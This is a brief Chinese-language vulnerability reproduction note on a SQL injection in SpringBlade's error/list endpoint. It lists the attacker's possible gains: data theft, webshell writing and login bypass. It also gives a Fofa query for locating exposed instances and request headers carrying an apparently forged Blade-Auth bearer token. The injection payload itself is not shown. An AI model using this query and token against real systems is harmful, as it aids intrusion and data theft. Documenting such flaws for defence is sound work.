# Saber errorlist SQL 注入

## 漏洞描述
SpringBlade error/list SQL 注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

## 漏洞复现
1、Fofa

body="https://bladex.vip"

![1714227592941-29b0e2f9-d16e-4f82-b852-925165d4876e.png](/uploads/20260518/eec16cb3-acfd-4572-8a9b-0c46bf767bab.png)

```plain
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
